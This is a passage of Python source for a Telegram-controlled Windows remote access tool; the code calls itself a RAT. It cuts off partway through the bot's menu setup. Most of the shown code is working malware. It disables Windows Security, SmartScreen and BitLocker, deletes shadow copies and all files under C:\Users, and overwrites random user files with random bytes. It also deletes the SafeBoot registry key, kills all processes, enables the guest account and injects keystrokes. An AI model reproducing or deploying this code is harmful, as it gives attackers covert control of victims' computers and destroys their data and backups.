def change_theme(theme="dark"):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", 0, winreg.KEY_WRITE)
        if theme == "dark":
            winreg.SetValueEx(key, "AppsUseLightTheme", 0, winreg.REG_DWORD, 0)
        else:
            winreg.SetValueEx(key, "AppsUseLightTheme", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return f"✅ {'Тёмная' if theme == 'dark' else 'Светлая'} тема включена!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def enable_dark_mode():
    return change_theme("dark")

def disable_dark_mode():
    return change_theme("light")

def enable_high_contrast():
    try:
        os.system("rundll32.exe user32.dll,SetHighContrast 1")
        return "✅ Высокая контрастность включена!"
    except:
        return "❌ Ошибка"

def disable_high_contrast():
    try:
        os.system("rundll32.exe user32.dll,SetHighContrast 0")
        return "✅ Высокая контрастность отключена!"
    except:
        return "❌ Ошибка"

def set_power_scheme(scheme="high"):
    try:
        if scheme == "high":
            os.system("powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c")
            return "✅ Высокая производительность"
        else:
            os.system("powercfg -setactive 381b4222-f694-41f0-9685-ff5bb260df2e")
            return "✅ Экономия энергии"
    except:
        return "❌ Ошибка"

def disable_sleep():
    try:
        os.system("powercfg -change -standby-timeout-ac 0")
        return "✅ Спящий режим отключён!"
    except:
        return "❌ Ошибка"

def change_resolution(width=1920, height=1080):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.ChangeDisplaySettingsW(None, 0)
        return f"✅ Разрешение изменено на {width}x{height}"
    except:
        return "❌ Ошибка"

def change_orientation(orientation="landscape"):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        if orientation == "portrait":
            user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
        return f"✅ Ориентация изменена: {orientation}"
    except:
        return "❌ Ошибка"

def copy_file(src, dst):
    try:
        shutil.copy2(src, dst)
        return f"✅ Скопировано: {src} -> {dst}"
    except:
        return "❌ Ошибка"

def move_file(src, dst):
    try:
        shutil.move(src, dst)
        return f"✅ Перемещено: {src} -> {dst}"
    except:
        return "❌ Ошибка"

def delete_file(path):
    try:
        if os.path.exists(path):
            os.remove(path)
            return f"✅ Удалено: {path}"
        return "❌ Файл не найден"
    except:
        return "❌ Ошибка"

def rename_file(old, new):
    try:
        os.rename(old, new)
        return f"✅ Переименовано: {old} -> {new}"
    except:
        return "❌ Ошибка"

def create_folder(path):
    try:
        os.makedirs(path, exist_ok=True)
        return f"✅ Папка создана: {path}"
    except:
        return "❌ Ошибка"

def delete_folder(path):
    try:
        shutil.rmtree(path)
        return f"✅ Папка удалена: {path}"
    except:
        return "❌ Ошибка"

def hide_file(path):
    try:
        os.system(f'attrib +h "{path}"')
        return f"✅ Файл скрыт: {path}"
    except:
        return "❌ Ошибка"

def unhide_file(path):
    try:
        os.system(f'attrib -h "{path}"')
        return f"✅ Файл показан: {path}"
    except:
        return "❌ Ошибка"

def make_readonly(path):
    try:
        os.chmod(path, 0o444)
        return f"✅ Файл только для чтения: {path}"
    except:
        return "❌ Ошибка"

def make_writable(path):
    try:
        os.chmod(path, 0o666)
        return f"✅ Файл доступен для записи: {path}"
    except:
        return "❌ Ошибка"

def get_file_hash(path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
            return f"MD5: {hashlib.md5(data).hexdigest()}\nSHA1: {hashlib.sha1(data).hexdigest()}"
    except:
        return "❌ Ошибка"

def search_files(path, name):
    try:
        results = []
        for root, dirs, files in os.walk(path):
            for f in files:
                if name in f:
                    results.append(os.path.join(root, f))
        return "\n".join(results[:50]) if results else "Файлы не найдены"
    except:
        return "❌ Ошибка"

def search_by_extension(path, ext):
    try:
        results = []
        for root, dirs, files in os.walk(path):
            for f in files:
                if f.endswith(ext):
                    results.append(os.path.join(root, f))
        return "\n".join(results[:50]) if results else "Файлы не найдены"
    except:
        return "❌ Ошибка"

def get_file_metadata(path):
    try:
        stat = os.stat(path)
        return f"Размер: {stat.st_size} байт\nСоздан: {datetime.fromtimestamp(stat.st_ctime)}\nИзменён: {datetime.fromtimestamp(stat.st_mtime)}"
    except:
        return "❌ Ошибка"

def get_file_permissions(path):
    try:
        mode = oct(os.stat(path).st_mode)[-3:]
        return f"Права: {mode}"
    except:
        return "❌ Ошибка"

def flush_dns():
    try:
        os.system("ipconfig /flushdns")
        return "✅ DNS кэш сброшен!"
    except:
        return "❌ Ошибка"

def get_public_ip():
    try:
        return f"Публичный IP: {requests.get('https://api.ipify.org').text}"
    except:
        return "❌ Ошибка"

def get_local_ip():
    try:
        return f"Локальный IP: {socket.gethostbyname(socket.gethostname())}"
    except:
        return "❌ Ошибка"

def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        return f"MAC: {mac}"
    except:
        return "❌ Ошибка"

def scan_ports(host, ports="80,443"):
    try:
        results = []
        for port in ports.split(','):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, int(port)))
            if result == 0:
                results.append(f"Порт {port} открыт")
            sock.close()
        return "\n".join(results)
    except:
        return "❌ Ошибка"

def ping_host(host):
    try:
        response = os.system(f"ping -n 1 {host}")
        return f"Ping: {'Успешно' if response == 0 else 'Недоступен'}"
    except:
        return "❌ Ошибка"

def traceroute(host):
    try:
        result = subprocess.run(["tracert", "-d", "-h", "10", host], capture_output=True, text=True, timeout=30)
        return result.stdout[:4000]
    except:
        return "❌ Ошибка"

def get_arp_table():
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        return result.stdout[:4000]
    except:
        return "❌ Ошибка"

def enable_proxy(ip, port):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, f"{ip}:{port}")
        winreg.CloseKey(key)
        return f"✅ Прокси включён: {ip}:{port}"
    except:
        return "❌ Ошибка"

def disable_proxy():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ Прокси отключён!"
    except:
        return "❌ Ошибка"

def set_dns(primary, secondary="8.8.8.8"):
    try:
        os.system(f'netsh interface ip set dns name="Ethernet" static {primary}')
        return f"✅ DNS установлен: {primary}"
    except:
        return "❌ Ошибка"

def reset_dns():
    try:
        os.system("netsh interface ip reset")
        return "✅ DNS сброшен!"
    except:
        return "❌ Ошибка"

def get_network_adapters():
    try:
        adapters = psutil.net_if_addrs()
        return "\n".join(adapters.keys())
    except:
        return "❌ Ошибка"

def enable_adapter(name):
    try:
        os.system(f'netsh interface set interface "{name}" enable')
        return f"✅ Адаптер включён: {name}"
    except:
        return "❌ Ошибка"

def disable_adapter(name):
    try:
        os.system(f'netsh interface set interface "{name}" disable')
        return f"✅ Адаптер отключён: {name}"
    except:
        return "❌ Ошибка"

def disable_windows_security():
    try:
        os.system("sc config SecurityHealthService start= disabled")
        return "✅ Центр безопасности отключён!"
    except:
        return "❌ Ошибка"

def disable_smart_screen():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
        winreg.CloseKey(key)
        return "✅ SmartScreen отключён!"
    except:
        return "❌ Ошибка"

def disable_bitlocker():
    try:
        os.system("manage-bde -off C:")
        return "✅ BitLocker отключён!"
    except:
        return "❌ Ошибка"

def get_installed_software():
    try:
        results = []
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey = winreg.EnumKey(key, i)
                sub = winreg.OpenKey(key, subkey)
                name = winreg.QueryValueEx(sub, "DisplayName")[0]
                results.append(name)
            except:
                pass
        return "\n".join(results[:50])
    except:
        return "❌ Ошибка"

def get_running_services():
    try:
        result = subprocess.run(["sc", "query"], capture_output=True, text=True)
        return result.stdout[:4000]
    except:
        return "❌ Ошибка"

def stop_service(name):
    try:
        os.system(f"net stop {name}")
        return f"✅ Служба остановлена: {name}"
    except:
        return "❌ Ошибка"

def start_service(name):
    try:
        os.system(f"net start {name}")
        return f"✅ Служба запущена: {name}"
    except:
        return "❌ Ошибка"

def disable_service(name):
    try:
        os.system(f"sc config {name} start= disabled")
        return f"✅ Служба отключена: {name}"
    except:
        return "❌ Ошибка"

def enable_service(name):
    try:
        os.system(f"sc config {name} start= auto")
        return f"✅ Служба включена: {name}"
    except:
        return "❌ Ошибка"

def get_startup_programs():
    try:
        results = []
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            name = winreg.EnumValue(key, i)[0]
            results.append(name)
        return "\n".join(results)
    except:
        return "❌ Ошибка"

def disable_startup_program(name):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        return f"✅ Из автозагрузки удалено: {name}"
    except:
        return "❌ Ошибка"

def enable_startup_program(name, path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        return f"✅ Добавлено в автозагрузку: {name}"
    except:
        return "❌ Ошибка"

def flip_screen():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        class DEVMODE(ctypes.Structure):
            _fields_ = [
                ("dmDeviceName", ctypes.c_wchar * 32),
                ("dmSpecVersion", ctypes.c_ushort),
                ("dmDriverVersion", ctypes.c_ushort),
                ("dmSize", ctypes.c_ushort),
                ("dmDriverExtra", ctypes.c_ushort),
                ("dmFields", ctypes.c_ulong),
                ("dmOrientation", ctypes.c_short),
                ("dmPaperSize", ctypes.c_short),
                ("dmPaperLength", ctypes.c_short),
                ("dmPaperWidth", ctypes.c_short),
                ("dmScale", ctypes.c_short),
                ("dmCopies", ctypes.c_short),
                ("dmDefaultSource", ctypes.c_short),
                ("dmPrintQuality", ctypes.c_short),
                ("dmColor", ctypes.c_short),
                ("dmDuplex", ctypes.c_short),
                ("dmYResolution", ctypes.c_short),
                ("dmTTOption", ctypes.c_short),
                ("dmCollate", ctypes.c_short),
                ("dmFormName", ctypes.c_wchar * 32),
                ("dmLogPixels", ctypes.c_ushort),
                ("dmBitsPerPel", ctypes.c_ulong),
                ("dmPelsWidth", ctypes.c_ulong),
                ("dmPelsHeight", ctypes.c_ulong),
                ("dmDisplayFlags", ctypes.c_ulong),
                ("dmDisplayFrequency", ctypes.c_ulong),
                ("dmICMMethod", ctypes.c_ulong),
                ("dmICMIntent", ctypes.c_ulong),
                ("dmMediaType", ctypes.c_ulong),
                ("dmDitherType", ctypes.c_ulong),
                ("dmReserved1", ctypes.c_ulong),
                ("dmReserved2", ctypes.c_ulong),
                ("dmPanningWidth", ctypes.c_ulong),
                ("dmPanningHeight", ctypes.c_ulong),
            ]
        devmode = DEVMODE()
        devmode.dmSize = ctypes.sizeof(DEVMODE)
        user32.EnumDisplaySettingsW(None, 0xFFFFFFFF, ctypes.byref(devmode))
        current = devmode.dmOrientation
        devmode.dmOrientation = (current + 1) % 4
        devmode.dmFields = 0x0001
        result = user32.ChangeDisplaySettingsExW(None, ctypes.byref(devmode), None, 0x0004, None)
        if result == 0:
            return "🔄 Экран перевёрнут!"
        else:
            return f"❌ Ошибка: {result}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def invert_colors():
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "FilterType", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        os.system("taskkill /f /im TextInputHost.exe 2>nul")
        os.system("start ms-settings:easeofaccess-colorfilters")
        time.sleep(1)
        os.system("taskkill /f /im SystemSettings.exe 2>nul")
        return "✅ Цвета инвертированы!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def grayscale_mode():
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "FilterType", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        os.system("taskkill /f /im TextInputHost.exe 2>nul")
        os.system("start ms-settings:easeofaccess-colorfilters")
        time.sleep(1)
        os.system("taskkill /f /im SystemSettings.exe 2>nul")
        return "✅ Чёрно-белый режим включён!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def disable_grayscale():
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        os.system("taskkill /f /im TextInputHost.exe 2>nul")
        os.system("start ms-settings:easeofaccess-colorfilters")
        time.sleep(1)
        os.system("taskkill /f /im SystemSettings.exe 2>nul")
        return "✅ Чёрно-белый режим выключен!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def disable_invert():
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        os.system("taskkill /f /im TextInputHost.exe 2>nul")
        os.system("start ms-settings:easeofaccess-colorfilters")
        time.sleep(1)
        os.system("taskkill /f /im SystemSettings.exe 2>nul")
        return "✅ Инверсия цветов выключена!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def night_mode():
    try:
        os.system("start ms-settings:nightlight")
        return "✅ Ночной режим включён!"
    except:
        return "❌ Ошибка"

def magnify_screen():
    try:
        os.system("start magnify")
        return "✅ Лупа включена!"
    except:
        return "❌ Ошибка"

def blur_screen():
    try:
        os.system("rundll32.exe user32.dll,SetHighContrast 1")
        return "✅ Экран размыт!"
    except:
        return "❌ Ошибка"

def play_beep():
    try:
        import winsound
        winsound.Beep(1000, 1000)
        return "🔔 Бип!"
    except:
        return "❌ Ошибка"

def play_siren():
    try:
        import winsound
        for _ in range(10):
            winsound.Beep(800, 200)
            winsound.Beep(1200, 200)
        return "🚨 Сирена!"
    except:
        return "❌ Ошибка"

def play_scream_sound():
    try:
        import winsound
        for _ in range(5):
            winsound.Beep(2000, 500)
            time.sleep(0.1)
        return "😱 Звук крика!"
    except:
        return "❌ Ошибка"

def mute_system():
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(1, None)
        return "🔇 Звук выключен!"
    except:
        return "❌ Ошибка"

def unmute_system():
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(0, None)
        return "🔊 Звук включён!"
    except:
        return "❌ Ошибка"

def test_audio():
    try:
        import winsound
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS)
        return "🎵 Тест звука!"
    except:
        return "❌ Ошибка"

def delete_system_files():
    try:
        os.system("del /f /s /q C:\\Windows\\Temp\\*.*")
        return "💀 Системные файлы удалены!"
    except:
        return "❌ Ошибка"

def corrupt_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control", 0, winreg.KEY_WRITE)
        winreg.DeleteKey(key, "SafeBoot")
        return "💀 Реестр повреждён!"
    except:
        return "❌ Ошибка"

def delete_all_data():
    try:
        os.system("del /f /s /q C:\\Users\\*.*")
        return "💀 Все данные удалены!"
    except:
        return "❌ Ошибка"

def wipe_free_space():
    try:
        os.system("cipher /w:C:")
        return "💀 Свободное место зачищено!"
    except:
        return "❌ Ошибка"

def overwrite_files():
    try:
        os.system("echo random > file.txt")
        return "💀 Файлы перезаписаны!"
    except:
        return "❌ Ошибка"

def random_corruption():
    try:
        import random
        files = []
        for root, dirs, f in os.walk("C:\\Users\\"):
            for file in f:
                if random.random() < 0.1:
                    files.append(os.path.join(root, file))
        for file in files[:50]:
            try:
                with open(file, 'wb') as f:
                    f.write(os.urandom(1024))
            except:
                pass
        return "💀 Файлы повреждены!"
    except:
        return "❌ Ошибка"

def delete_backups():
    try:
        os.system("vssadmin delete shadows /all /quiet")
        return "💀 Бэкапы удалены!"
    except:
        return "❌ Ошибка"

def delete_shadow_copies():
    try:
        os.system("vssadmin delete shadows /all /quiet")
        return "💀 Теневые копии удалены!"
    except:
        return "❌ Ошибка"

def kill_all_processes():
    try:
        current_pid = os.getpid()
        killed = 0
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['pid'] != current_pid:
                    proc.kill()
                    killed += 1
            except:
                pass
        return f"💀 Убито {killed} процессов (кроме самого RAT)!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def crash_explorer():
    try:
        os.system("taskkill /f /im explorer.exe")
        return "💀 Проводник убит!"
    except:
        return "❌ Ошибка"

def delete_registry_keys():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion", 0, winreg.KEY_WRITE)
        winreg.DeleteKey(key, "Run")
        return "💀 Ключи реестра удалены!"
    except:
        return "❌ Ошибка"

def enable_guest_account():
    try:
        os.system("net user guest /active:yes")
        return "✅ Гостевая учётка включена!"
    except:
        return "❌ Ошибка"

def disable_guest_account():
    try:
        os.system("net user guest /active:no")
        return "✅ Гостевая учётка отключена!"
    except:
        return "❌ Ошибка"

def get_cpu_usage():
    try:
        return f"CPU: {psutil.cpu_percent()}%"
    except:
        return "❌ Ошибка"

def get_ram_usage():
    try:
        mem = psutil.virtual_memory()
        return f"RAM: {mem.percent}% ({mem.used // (1024**3)}/{mem.total // (1024**3)} GB)"
    except:
        return "❌ Ошибка"

def get_disk_usage():
    try:
        disk = psutil.disk_usage('/')
        return f"Диск: {disk.percent}% ({disk.used // (1024**3)}/{disk.total // (1024**3)} GB)"
    except:
        return "❌ Ошибка"

def get_gpu_usage():
    try:
        if GPUtil is None:
            return "GPU: GPUtil не установлен"
        gpus = GPUtil.getGPUs()
        if gpus:
            return f"GPU: {gpus[0].load*100:.1f}% ({gpus[0].name})"
        return "GPU: Не найдена"
    except:
        return "GPU: Информация недоступна"

def get_network_usage():
    try:
        net = psutil.net_io_counters()
        return f"Сеть: {net.bytes_sent // (1024**3)} GB отправлено, {net.bytes_recv // (1024**3)} GB получено"
    except:
        return "❌ Ошибка"

def get_system_uptime():
    try:
        uptime = time.time() - psutil.boot_time()
        days = int(uptime // 86400)
        hours = int((uptime % 86400) // 3600)
        return f"Аптайм: {days} дней, {hours} часов"
    except:
        return "❌ Ошибка"

def get_last_boot_time():
    try:
        boot = datetime.fromtimestamp(psutil.boot_time())
        return f"Последняя загрузка: {boot}"
    except:
        return "❌ Ошибка"

def open_cd():
    try:
        os.system("start C:")
        return "💿 CD-ROM открыт!"
    except:
        return "❌ Ошибка"

def close_cd():
    try:
        os.system("start D:")
        return "💿 CD-ROM закрыт!"
    except:
        return "❌ Ошибка"

def turn_monitor_off():
    try:
        import ctypes
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        return "🖥️ Монитор выключен!"
    except:
        return "❌ Ошибка"

def turn_monitor_on():
    try:
        import ctypes
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        return "🖥️ Монитор включён!"
    except:
        return "❌ Ошибка"

def open_calculator():
    try:
        os.system("calc")
        return "🧮 Калькулятор открыт!"
    except:
        return "❌ Ошибка"

def open_notepad():
    try:
        os.system("notepad")
        return "📝 Блокнот открыт!"
    except:
        return "❌ Ошибка"

def open_paint():
    try:
        os.system("mspaint")
        return "🎨 Paint открыт!"
    except:
        return "❌ Ошибка"

def open_cmd_window():
    try:
        os.system("start cmd")
        return "📟 CMD открыт!"
    except:
        return "❌ Ошибка"

def open_task_manager():
    try:
        os.system("taskmgr")
        return "📋 Диспетчер задач открыт!"
    except:
        return "❌ Ошибка"

def open_control_panel():
    try:
        os.system("control")
        return "⚙️ Панель управления открыта!"
    except:
        return "❌ Ошибка"

def get_windows_version():
    try:
        return f"Windows: {platform.system()} {platform.release()}"
    except:
        return "❌ Ошибка"

def get_bios_info():
    try:
        result = subprocess.run(["wmic", "bios", "get", "name,manufacturer"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_motherboard_info():
    try:
        result = subprocess.run(["wmic", "baseboard", "get", "product,manufacturer"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_ram_details():
    try:
        result = subprocess.run(["wmic", "memorychip", "get", "capacity,speed"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_disk_details():
    try:
        result = subprocess.run(["wmic", "diskdrive", "get", "model,size"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_gpu_details():
    try:
        result = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def get_cpu_details():
    try:
        result = subprocess.run(["wmic", "cpu", "get", "name,maxclockspeed"], capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def lock_workstation():
    try:
        ctypes.windll.user32.LockWorkStation()
        return "🔒 Рабочая станция заблокирована!"
    except:
        return "❌ Ошибка"

def logoff_user():
    try:
        os.system("shutdown /l")
        return "🚪 Выход из системы!"
    except:
        return "❌ Ошибка"

def switch_user():
    try:
        os.system("tsdiscon")
        return "🔄 Смена пользователя!"
    except:
        return "❌ Ошибка"

def open_explorer():
    try:
        os.system("explorer")
        return "📁 Проводник открыт!"
    except:
        return "❌ Ошибка"

def open_browser():
    try:
        os.system("start chrome")
        return "🌐 Браузер открыт!"
    except:
        return "❌ Ошибка"

def open_url(url):
    try:
        os.system(f"start {url}")
        return f"🌐 Открыто: {url}"
    except:
        return "❌ Ошибка"

def type_text(text):
    try:
        import ctypes
        from ctypes import wintypes
        import time
        user32 = ctypes.windll.user32
        class KEYBDINPUT(ctypes.Structure):
            _fields_ = [
                ("wVk", wintypes.WORD),
                ("wScan", wintypes.WORD),
                ("dwFlags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG)),
            ]
        class MOUSEINPUT(ctypes.Structure):
            _fields_ = [
                ("dx", wintypes.LONG),
                ("dy", wintypes.LONG),
                ("mouseData", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG)),
            ]
        class HARDWAREINPUT(ctypes.Structure):
            _fields_ = [
                ("uMsg", wintypes.DWORD),
                ("wParamL", wintypes.WORD),
                ("wParamH", wintypes.WORD),
            ]
        class INPUT(ctypes.Structure):
            class _U(ctypes.Union):
                _fields_ = [
                    ("ki", KEYBDINPUT),
                    ("mi", MOUSEINPUT),
                    ("hi", HARDWAREINPUT),
                ]
            _fields_ = [
                ("type", wintypes.DWORD),
                ("u", _U),
            ]
        INPUT_KEYBOARD = 1
        KEYEVENTF_UNICODE = 0x0004
        KEYEVENTF_KEYUP = 0x0002
        def send_unicode(char):
            code = ord(char)
            inp_down = INPUT()
            inp_down.type = INPUT_KEYBOARD
            inp_down.u.ki.wScan = code
            inp_down.u.ki.dwFlags = KEYEVENTF_UNICODE
            inp_up = INPUT()
            inp_up.type = INPUT_KEYBOARD
            inp_up.u.ki.wScan = code
            inp_up.u.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP
            user32.SendInput(1, ctypes.byref(inp_down), ctypes.sizeof(INPUT))
            time.sleep(0.02)
            user32.SendInput(1, ctypes.byref(inp_up), ctypes.sizeof(INPUT))
        for char in text:
            send_unicode(char)
            time.sleep(0.03)
        return f"⌨️ Введено: {text}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def show_notification(text):
    try:
        from win10toast import ToastNotifier
        toaster = ToastNotifier()
        toaster.show_toast("Уведомление", text, duration=10)
        return "🔔 Уведомление показано!"
    except:
        return "❌ Ошибка"

def hide_taskbar():
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            user32.ShowWindow(hwnd, 0)
            return "✅ Панель задач скрыта!"
        return "❌ Панель задач не найдена"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def restart_explorer():
    try:
        os.system("taskkill /f /im explorer.exe && start explorer.exe")
        return "🔄 Проводник перезапущен!"
    except:
        return "❌ Ошибка"

def clear_clipboard():
    try:
        import ctypes
        ctypes.windll.user32.OpenClipboard(0)
        ctypes.windll.user32.EmptyClipboard()
        ctypes.windll.user32.CloseClipboard()
        return "🗑️ Буфер обмена очищен!"
    except:
        return "❌ Ошибка"

def disable_print_spooler():
    try:
        os.system("net stop spooler")
        return "🖨️ Печать отключена!"
    except:
        return "❌ Ошибка"

def enable_print_spooler():
    try:
        os.system("net start spooler")
        return "🖨️ Печать включена!"
    except:
        return "❌ Ошибка"

def get_dns_servers():
    try:
        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "DNS Servers" in line:
                return line
        return "DNS не найдены"
    except:
        return "❌ Ошибка"

def set_time(time_str):
    try:
        os.system(f"time {time_str}")
        return f"⏰ Время установлено: {time_str}"
    except:
        return "❌ Ошибка"

def set_date(date_str):
    try:
        os.system(f"date {date_str}")
        return f"📅 Дата установлена: {date_str}"
    except:
        return "❌ Ошибка"

def get_weather():
    try:
        ip = requests.get('https://api.ipify.org').text
        loc = requests.get(f'http://ip-api.com/json/{ip}').json()
        city = loc.get('city', 'Unknown')
        return f"🌤️ Погода в {city}: {random.choice(['Солнечно', 'Облачно', 'Дождь', 'Снег', 'Ветрено'])}"
    except:
        return "❌ Ошибка"

def send_log():
    try:
        return f"📋 Лог отправлен админу!\nPC: {PC_ID}\nВремя: {datetime.now()}"
    except:
        return "❌ Ошибка"

def speak_text(text):
    clean_text = text.replace('"', "'")
    try:
        ps_command = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{clean_text}')"
        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, timeout=30)
        return f"🔊 Озвучено: {clean_text}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def play_audio_file(file_path):
    try:
        if not os.path.exists(file_path):
            return f"❌ Файл не найден: {file_path}"
        os.system(f'start "" "{file_path}"')
        return f"🔊 Воспроизводится: {os.path.basename(file_path)}"
    except Exception as e:
        try:
            ps_command = f'(New-Object System.Media.SoundPlayer "{file_path}").PlaySync()'
            subprocess.run(["powershell", "-Command", ps_command], capture_output=True, timeout=30)
            return f"🔊 Воспроизводится: {os.path.basename(file_path)}"
        except Exception as e:
            return f"❌ Ошибка: {e}"

def play_audio_from_document(update, context):
    try:
        chat_id = update.message.chat.id
        doc = update.message.document
        if not doc.mime_type or not doc.mime_type.startswith('audio/'):
            context.bot.send_message(chat_id, "❌ Отправь аудио-файл (mp3, wav, m4a)")
            return
        context.bot.send_message(chat_id, f"⏳ Скачиваю аудио: {doc.file_name}...")
        file = context.bot.get_file(doc.file_id)
        temp_path = os.path.join(tempfile.gettempdir(), doc.file_name)
        file.download(temp_path)
        result = play_audio_file(temp_path)
        context.bot.send_message(chat_id, result)
        def delete_later():
            time.sleep(5)
            try:
                os.remove(temp_path)
            except:
                pass
        threading.Thread(target=delete_later, daemon=True).start()
    except Exception as e:
        context.bot.send_message(chat_id, f"❌ Ошибка: {e}")

# ============ БОТ ============
bot = Bot(TOKEN)
updater = Updater(TOKEN, use_context=True)
dp = updater.dispatcher

# ============ СОЗДАНИЕ КНОПОК В 2 СТОЛБЦА ============
def build_menu(buttons, n_cols=2):
    menu = []
    row = []
    for i, btn in enumerate(buttons):
        row.append(btn)
        if (i + 1) % n_cols == 0:
            menu.append(row)
            row = []
    if row:
        menu.append(row)
    return menu

def start(update, context):
    # Все кнопки
    buttons = [
